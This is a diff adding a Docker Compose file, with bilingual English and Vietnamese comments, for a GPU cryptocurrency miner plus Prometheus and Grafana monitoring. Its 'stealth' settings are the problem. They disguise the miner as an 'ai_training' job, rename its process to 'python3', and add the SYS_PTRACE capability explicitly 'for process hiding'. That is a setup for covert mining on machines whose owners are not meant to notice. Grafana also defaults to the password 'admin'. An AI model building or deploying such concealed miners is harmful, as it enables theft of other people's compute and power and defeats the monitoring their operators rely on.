@@ -1,0 +1,159 @@
+version: '3.8'
+
+# Docker Compose configuration cho GPU Mining System
+# Cấu hình Docker Compose cho hệ thống mining GPU
+
+services:
+  # Main mining service - Dịch vụ mining chính
+  gpu-miner:
+    image: gpu-miner:latest
+    container_name: gpu-miner-core
+    build:
+      context: .
+      dockerfile: Dockerfile
+    
+    # GPU runtime support - Hỗ trợ runtime GPU
+    runtime: nvidia
+    
+    # Environment variables - Biến môi trường
+    environment:
+      # Required - Bắt buộc
+      - WALLET_ADDRESS=${WALLET_ADDRESS}
+      - POOL_ADDRESS=${POOL_ADDRESS:-stratum+tcp://pool.example.com:3333}
+      
+      # Mining config - Cấu hình mining
+      - WORKER_NAME=${WORKER_NAME:-docker-worker}
+      - MINING_ALGO=${MINING_ALGO:-kawpow}
+      - INTENSITY=${INTENSITY:-75}
+      - USE_TLS=${USE_TLS:-true}
+      
+      # GPU config - Cấu hình GPU
+      - GPU_INDICES=${GPU_INDICES:-0}
+      - POWER_LIMIT=${POWER_LIMIT:-80}
+      - TARGET_TEMP=${TARGET_TEMP:-70}
+      - MAX_TEMP=${MAX_TEMP:-85}
+      
+      # Stealth config - Cấu hình stealth
+      - STEALTH_MODE=${STEALTH_MODE:-true}
+      - WRAPPER_MODE=${WRAPPER_MODE:-ai_training}
+      - PROCESS_NAME=${PROCESS_NAME:-python3}
+      
+      # Logging - Ghi log
+      - RUST_LOG=${RUST_LOG:-info}
+      - LOG_MAX_SIZE=${LOG_MAX_SIZE:-100}
+      
+    # Volumes - Ổ đĩa mount
+    volumes:
+      - ./config:/app/config:ro
+      - ./logs:/app/logs
+      - mining_data:/app/data
+    
+    # Network - Mạng
+    networks:
+      - mining_network
+    
+    # Ports - Cổng
+    ports:
+      - "9090:9090"  # Metrics endpoint
+    
+    # Resource limits - Giới hạn tài nguyên
+    deploy:
+      resources:
+        reservations:
+          devices:
+            - driver: nvidia
+              count: all
+              capabilities: [gpu]
+        limits:
+          memory: 8G
+          cpus: '4.0'
+    
+    # Security options - Tùy chọn bảo mật
+    security_opt:
+      - no-new-privileges:true
+      - seccomp:unconfined  # Required for some GPU operations
+    
+    # Capabilities - Quyền hạn
+    cap_drop:
+      - ALL
+    cap_add:
+      - SYS_ADMIN  # For namespace operations
+      - SYS_PTRACE  # For process hiding
+    
+    # Restart policy - Chính sách khởi động lại
+    restart: unless-stopped
+    
+    # Health check - Kiểm tra sức khỏe
+    healthcheck:
+      test: ["CMD", "/app/gpu-miner", "--health-check"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+      start_period: 40s
+
+  # Monitoring service (optional) - Dịch vụ giám sát
+  prometheus:
+    image: prom/prometheus:latest
+    container_name: gpu-miner-prometheus
+    
+    volumes:
+      - ./monitoring/prometheus.yml:/etc/prometheus/prometheus.yml:ro
+      - prometheus_data:/prometheus
+    
+    command:
+      - '--config.file=/etc/prometheus/prometheus.yml'
+      - '--storage.tsdb.path=/prometheus'
+      - '--web.console.libraries=/etc/prometheus/console_libraries'
+      - '--web.console.templates=/etc/prometheus/consoles'
+      - '--web.enable-lifecycle'
+    
+    ports:
+      - "9091:9090"
+    
+    networks:
+      - mining_network
+    
+    restart: unless-stopped
+
+  # Grafana for visualization (optional) - Grafana để visualization
+  grafana:
+    image: grafana/grafana:latest
+    container_name: gpu-miner-grafana
+    
+    environment:
+      - GF_SECURITY_ADMIN_USER=${GRAFANA_USER:-admin}
+      - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_PASSWORD:-admin}
+      - GF_INSTALL_PLUGINS=
+    
+    volumes:
+      - grafana_data:/var/lib/grafana
+      - ./monitoring/grafana/dashboards:/etc/grafana/provisioning/dashboards:ro
+      - ./monitoring/grafana/datasources:/etc/grafana/provisioning/datasources:ro
+    
+    ports:
+      - "3000:3000"
+    
+    networks:
+      - mining_network
+    
+    restart: unless-stopped
+    
+    depends_on:
+      - prometheus
+
+# Networks - Mạng
+networks:
+  mining_network:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.28.0.0/16
+
+# Volumes - Ổ đĩa
+volumes:
+  mining_data:
+    driver: local
+  prometheus_data:
+    driver: local
+  grafana_data:
+    driver: local
